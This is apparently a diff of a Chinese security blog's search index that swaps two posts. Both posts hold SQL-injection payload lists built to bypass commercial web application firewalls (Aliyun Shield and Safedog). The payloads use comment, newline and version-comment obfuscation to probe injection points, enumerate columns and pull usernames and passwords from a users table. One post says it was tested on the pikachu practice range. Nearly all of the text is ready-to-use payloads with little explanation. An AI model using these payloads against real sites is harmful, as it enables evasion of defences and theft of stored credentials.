@@ -4,11 +4,11 @@
   
     
     <entry>
-      <title>打狗棍法</title>
-      <link href="/2022/07/06/%E5%AE%89%E5%85%A8%E7%8B%97payload/"/>
-      <url>/2022/07/06/%E5%AE%89%E5%85%A8%E7%8B%97payload/</url>
+      <title>过阿里云盾</title>
+      <link href="/2022/07/06/20211114%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BEsql%E6%B3%A8%E5%85%A5/"/>
+      <url>/2022/07/06/20211114%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BEsql%E6%B3%A8%E5%85%A5/</url>
       
-        <content type="html"><![CDATA[<hr><span id="more"></span><p>以下内容测试为pikachu靶场</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C 2 %23</p><p>kobe%27+order++%2F<em>90000aaa</em>%2F%2F*%2190000aaa*%2F%2F*%2190000aaa*%2F+%23%0aby+%2F*%2190000aaa*%2F1%23</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    database(&#x2F;<em>%!a</em>&#x2F;)</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;username%2C password from (users)</p>]]></content>
+        <content type="html"><![CDATA[<hr><span id="more"></span><p>常用就是注释配合换行符，然后在注释部分插入不可解析的ascii码<br>–%20&#x2F;<em>%99%0a<br>–%20%0d%0a%23&#x2F;</em>%99%0a<br>%23&#x2F;*%99%0a</p><p>探测注入点：</p><p>?id&#x3D;1%27or%271#字符型注入<br>?id&#x3D;1%20or%201#数字型注入</p><p>order by判断列表</p><p>?id&#x3D;1%27order%20by%20id%23<br>?id&#x3D;1%27order%23&#x2F;<em>%99%0aby%23&#x2F;</em>%99%0a4%23<br>?id&#x3D;1%20order%23&#x2F;<em>%99%0aby%23&#x2F;</em>%99%0aid%23<br>?id&#x3D;1%20order%23&#x2F;<em>%99%0aby%23&#x2F;</em>%99%0a4%23</p><p>联合注入：</p><p>?id&#x3D;union%23&#x2F;<em>%99%0aselect<br>?id&#x3D;union–%20%0d%0a%23&#x2F;</em>%99%0aselect<br>?id&#x3D;union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0aa,2,asd<br>?id&#x3D;union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,id,3%20from%20users<br>?id&#x3D;1%27union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,id,3%20from%20users%23%27<br>?id&#x3D;1%20union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,id,3%20from%20users%23<br>?id&#x3D;1%27union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,%23&#x2F;*%99%0auser(),3%20from%20users%23</p><p>转至橘子</p>]]></content>
       
       
       
@@ -17,11 +17,11 @@
     
     
     <entry>
-      <title>过阿里云盾</title>
-      <link href="/2022/07/06/20211114%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BEsql%E6%B3%A8%E5%85%A5/"/>
-      <url>/2022/07/06/20211114%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BEsql%E6%B3%A8%E5%85%A5/</url>
+      <title>打狗棍法</title>
+      <link href="/2022/07/06/%E5%AE%89%E5%85%A8%E7%8B%97payload/"/>
+      <url>/2022/07/06/%E5%AE%89%E5%85%A8%E7%8B%97payload/</url>
       
-        <content type="html"><![CDATA[<hr><span id="more"></span><p>常用就是注释配合换行符，然后在注释部分插入不可解析的ascii码<br>–%20&#x2F;<em>%99%0a<br>–%20%0d%0a%23&#x2F;</em>%99%0a<br>%23&#x2F;*%99%0a</p><p>探测注入点：</p><p>?id&#x3D;1%27or%271#字符型注入<br>?id&#x3D;1%20or%201#数字型注入</p><p>order by判断列表</p><p>?id&#x3D;1%27order%20by%20id%23<br>?id&#x3D;1%27order%23&#x2F;<em>%99%0aby%23&#x2F;</em>%99%0a4%23<br>?id&#x3D;1%20order%23&#x2F;<em>%99%0aby%23&#x2F;</em>%99%0aid%23<br>?id&#x3D;1%20order%23&#x2F;<em>%99%0aby%23&#x2F;</em>%99%0a4%23</p><p>联合注入：</p><p>?id&#x3D;union%23&#x2F;<em>%99%0aselect<br>?id&#x3D;union–%20%0d%0a%23&#x2F;</em>%99%0aselect<br>?id&#x3D;union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0aa,2,asd<br>?id&#x3D;union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,id,3%20from%20users<br>?id&#x3D;1%27union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,id,3%20from%20users%23%27<br>?id&#x3D;1%20union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,id,3%20from%20users%23<br>?id&#x3D;1%27union–%20%0d%0a%23&#x2F;<em>%99%0aselect–%20%0d%0a%23&#x2F;</em>%99%0a1,%23&#x2F;*%99%0auser(),3%20from%20users%23</p><p>转至橘子</p>]]></content>
+        <content type="html"><![CDATA[<hr><span id="more"></span><p>以下内容测试为pikachu靶场</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C 2 %23</p><p>kobe%27+order++%2F<em>90000aaa</em>%2F%2F*%2190000aaa*%2F%2F*%2190000aaa*%2F+%23%0aby+%2F*%2190000aaa*%2F1%23</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    database(&#x2F;<em>%!a</em>&#x2F;)</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;username%2C password from (users)</p>]]></content>
       
       
       
